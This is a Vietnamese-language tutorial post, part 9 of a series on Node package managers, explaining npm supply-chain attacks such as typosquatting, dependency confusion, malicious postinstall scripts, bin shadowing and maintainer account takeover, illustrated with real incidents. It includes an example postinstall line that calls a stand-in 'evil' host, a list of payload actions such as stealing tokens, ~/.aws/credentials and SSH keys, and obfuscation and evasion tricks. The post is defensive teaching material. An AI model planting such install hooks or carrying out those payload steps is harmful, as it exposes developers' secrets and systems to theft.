@@ -1,0 +1,213 @@
+---
+title: 'Node Package Managers · Part 9 — Supply-Chain Attacks'
+description: 'How attackers get code into your node_modules: typosquatting, dependency confusion, malicious postinstall payloads, maintainer account takeover, and protestware — dissected through real npm incidents.'
+pubDate: 2026-06-24
+tags: [security, supply-chain, npm, dependency-confusion, package_managers_12]
+series: package-managers
+seriesOrder: 9
+draft: false
+---
+
+Đây là **Phần 9 của series 12 phần** về package manager Node. Mọi thứ tới giờ dồn về đây: bạn đã hiểu lifecycle script (Phần 7), tải binary không xác minh (Phần 8), và lòng tin lockfile (Phần 6). Phần này cho thấy kẻ tấn công **vũ khí hoá** tất cả ra sao. Phần 10 là phòng thủ.
+
+> Sự thật trần trụi: một app điển hình có **hàng trăm tới hàng nghìn** dependency transitive, mỗi cái do người lạ bảo trì, mỗi cái có thể chạy code trên máy bạn lúc cài. Ranh giới tin cậy thật của bạn là *toàn bộ* cây dependency.
+
+---
+
+## 1. Bản đồ bề mặt tấn công
+
+```text
+        ┌──────────────────────────────────────────────┐
+        │  WAYS MALICIOUS CODE ENTERS YOUR node_modules │
+        └──────────────────────────────────────────────┘
+  1. You install the WRONG package        → typosquatting / confusion
+  2. A package you DO use turns malicious  → account takeover, hijack
+  3. A DEEP transitive dep turns malicious → you never chose it directly
+  4. The install STEP itself runs payload  → malicious postinstall
+  5. A native binary is swapped            → off-registry download (Part 8)
+{cài sai package · package đang dùng hoá độc · dep transitive sâu · bước install chạy payload · binary bị tráo}
+```
+
+Mỗi cái ứng với một lớp sự cố thật, lặp lại. Lần lượt từng cái.
+
+### Toán bán kính nổ — vì sao một package nhỏ lại quan trọng
+
+Rủi ro chuỗi cung ứng là *nhân*, không phải cộng. Một utility cấp thấp bị xâm nhập lan ngược lên qua mọi thứ phụ thuộc nó:
+
+```text
+left-pad / debug / ansi-styles  (tiny, "trivial" packages)
+        │ depended on by thousands of packages
+        ▼
+   chalk, express, webpack, eslint, ...        (direct dependents)
+        │ depended on by millions of apps
+        ▼
+   YOUR app — which never listed the tiny package at all
+{app của bạn — chưa từng liệt kê package nhỏ kia}
+```
+
+Đây là lý do sự cố **left-pad** 2016 (package 11 dòng bị tác giả gỡ) làm vỡ hàng nghìn build toàn cầu trong vài phút. Bài học không phải "left-pad quan trọng" — mà là **package sâu nhất, nhỏ nhất, ít bị soi nhất lại có bán kính nổ lớn nhất**.
+
+---
+
+## 2. Typosquatting
+
+Kẻ tấn công publish package có tên là lỗi gõ phổ biến hoặc trông giống package nổi tiếng:
+
+```text
+real        →   typosquat        {giả}
+cross-env   →   crossenv, cross-env.js
+lodash      →   lodahs, 1odash
+react-dom   →   reactdom, react-dom-router
+event-stream→   event-streamzz
+```
+
+Bạn gõ nhầm `npm install`, hoặc copy tutorial độc hại, và bạn đã cài package của kẻ tấn công — `postinstall` của nó tuồn env var. `npx` làm tệ hơn: `npx crossenv` *tải và chạy* ngay. Sự cố `crossenv` 2017 làm đúng điều này — trộm biến môi trường (thường chứa token).
+
+---
+
+## 3. Dependency confusion
+
+Cái này tàn phá vì không cần gõ nhầm. Nhớ lại registry scoped/riêng ở Phần 2. Nếu công ty bạn dùng package nội bộ `@myco/auth` từ registry riêng, nhưng manager *cũng* được phép nhìn registry npm công khai:
+
+```text
+internal registry:  @myco/auth @ 1.2.0   (private, the real one)
+attacker publishes: @myco/auth @ 99.0.0  (PUBLIC npm, fake)
+
+resolver sees ^1.2.0 ... but 99.0.0 is "newer" and PUBLIC →
+some misconfigs pull the PUBLIC fake instead of the private real one.
+{vài cấu hình sai kéo bản công khai giả thay vì bản riêng thật}
+```
+
+Công bố công khai năm 2021 bởi Alex Birsan, kỹ thuật này xâm nhập Apple, Microsoft và hàng chục công ty khác — chỉ bằng publish package công khai trùng tên nội bộ. Cách sửa là ghim scope→registry nghiêm ngặt và scope đã xác minh (Phần 10).
+
+---
+
+## 4. `postinstall` độc hại
+
+Cơ chế giao payload đứng sau hầu hết. Một khi package độc hại vào cây của bạn (bằng đường nào ở trên), script install của nó chạy:
+
+```json
+{
+  "scripts": {
+    "postinstall": "node -e \"require('https').get('https://evil/x',r=>{...})\""
+  }
+}
+```
+
+```text
+Typical postinstall payloads {payload postinstall điển hình}:
+  - read process.env → POST tokens/secrets to attacker server
+  - read ~/.npmrc, ~/.aws/credentials, SSH keys
+  - download a second-stage binary (Part 8 vector)
+  - inject a backdoor into other files on disk
+  - in CI: steal the deployment credentials, then self-delete
+```
+
+Đây là lý do Phần 7 và 10 nhấn mạnh `--ignore-scripts`: nó loại bỏ hook thực thi phổ biến nhất.
+
+### Payload lúc cài vs lúc chạy
+
+`--ignore-scripts` mạnh nhưng **không** phải phòng thủ trọn vẹn, vì có hai thời điểm khác nhau kẻ tấn công có thể khai hỏa:
+
+```text
+INSTALL-TIME   postinstall / preinstall runs during `npm install`
+{lúc cài}        → blocked by --ignore-scripts ✓
+
+RUNTIME        malicious code in the package's MAIN module, runs when your
+{lúc chạy}       app `require()`s/`import`s it → --ignore-scripts does NOTHING
+                 → only caught by review, behavioral analysis, or sandboxing
+```
+
+`ua-parser-js` khét tiếng và nhiều kẻ trộm crypto dùng hook **lúc cài**, nhưng payload tinh vi ngày càng ẩn trong code **lúc chạy**, thường **che giấu** và **có điều kiện** để né phát hiện:
+
+```text
+Evasion tricks {mẹo né tránh}:
+  - obfuscate: base64/hex-encoded strings, eval'd at runtime
+  - gate on environment: only fire in CI, or on a specific OS/geo, or after
+    a delay → looks clean in a quick manual review and in sandboxes
+  - split payload across versions: benign on publish, malicious in a patch
+```
+
+Điểm rút ra: tắt script thu hẹp bề mặt tấn công nhiều, nhưng vẫn cần ghim version, review, và giám sát hành vi (Phần 10) cho payload lúc chạy.
+
+### Mẹo che `bin`
+
+Nhớ ở Phần 2 npm đặt `bin` của mọi dependency vào `node_modules/.bin` và thêm nó vào đầu `PATH` khi chạy script. Một package độc hại có thể khai báo `bin` trùng tên tool phổ biến — `tsc`, `eslint`, kể cả `node` — để **che** cái thật trong script `npm run`. `"build": "tsc"` của bạn rồi âm thầm chạy binary của kẻ tấn công.
+
+---
+
+## 5. Chiếm tài khoản maintainer & cướp package
+
+Đôi khi package là cái bạn phụ thuộc hợp pháp — cho tới khi tài khoản maintainer bị xâm nhập, hoặc quyền sở hữu được chuyển cho kẻ xấu. Ba ca đáng nhớ:
+
+```text
+event-stream (2018)
+  A maintainer handed the project to a "volunteer" who added a malicious
+  dependency (flatmap-stream) targeting a specific bitcoin wallet app.
+  Millions of downloads before discovery.
+{maintainer giao project cho "tình nguyện viên" rồi thêm dep độc hại}
+
+ua-parser-js (2021)
+  Maintainer's npm account hijacked → malicious versions published that
+  installed a cryptominer + password stealer. Huge blast radius.
+{tài khoản bị chiếm → publish bản độc cài cryptominer + trộm mật khẩu}
+
+node-ipc (2022) — "protestware"
+  The maintainer themselves added code that, based on geolocation,
+  overwrote users' files. Trust betrayed by the author, not a hijacker.
+{chính tác giả thêm code ghi đè file user dựa trên vị trí địa lý}
+```
+
+Bài học: một package nổi tiếng và lâu năm **không** làm phiên bản *kế tiếp* của nó an toàn. Lòng tin theo từng version, không theo package.
+
+---
+
+## 6. Range `^` là con đường giao hàng
+
+Nối lại Phần 1. Tấn công loại 5 ship một **version độc hại mới**. Nó tới bạn tự động ra sao? Qua range `^`:
+
+```text
+your package.json: "ua-parser-js": "^0.7.28"
+attacker publishes 0.7.29 (malicious) ...
+next `npm install` WITHOUT a frozen lockfile → resolves 0.7.29 → pwned.
+{lần install kế không-frozen → resolve bản độc → bị hack}
+```
+
+Đây chính là lý do sổ tay phòng thủ (Phần 10) xoay quanh: **lockfile frozen trong CI**, **min-release-age** (đừng tự nhận version mới publish vài phút trước), và **ghim integrity**.
+
+---
+
+## 7. Bài học xz — tấn công kiên nhẫn nhiều năm
+
+Backdoor `xz`/`liblzma` 2024 không phải npm, nhưng mọi kỹ sư Node phải khắc cốt: kẻ tấn công bỏ **nhiều năm** xây lòng tin maintainer, rồi nhét backdoor che giấu vào release tarball (không phải source git công khai) nhắm một binary đã biên dịch.
+
+```text
+Why it maps to npm directly {vì sao nó ánh xạ thẳng tới npm}:
+  - the published TARBALL differed from the public source repo
+    → "the git repo looks clean" is NOT proof the npm package is clean
+  - the payload lived in a BUILD artifact / binary (Part 8!)
+  - social engineering of a tired solo maintainer is the real exploit
+{tarball publish khác repo git công khai · payload nằm trong binary · social engineering maintainer đơn độc}
+```
+
+Điểm rút ra: **audit nội dung package đã publish, không chỉ repo GitHub**, và nghi ngờ sâu sắc binary không tới từ registry kiểm tra integrity.
+
+---
+
+## Giờ bạn đã biết gì
+
+- Code độc vào qua **package sai**, **package-tốt-hoá-xấu**, hoặc **dep transitive sâu**.
+- **`postinstall`** là hook thực thi payload chủ đạo.
+- **Dependency confusion** khai thác cấu hình scope→registry lỏng; nó xâm nhập các công ty lớn.
+- Lòng tin theo **từng version**: range `^` + install không-frozen tự giao bản cập nhật độc.
+- Tarball publish có thể khác source git (xz) — audit artifact.
+
+---
+
+## Bài tập
+
+1. Chạy `npm audit` trên project thật và phân loại từng phát hiện theo lớp tấn công ở trên.
+2. Đếm số dependency của project. Ngẫm xem bao nhiêu người lạ có thể chạy code trên máy bạn.
+3. Chọn một dependency phổ biến và đọc nội dung tarball đã publish, so với repo GitHub.
+
+Tiếp theo — Phần 10: Phòng thủ chuỗi cung ứng:
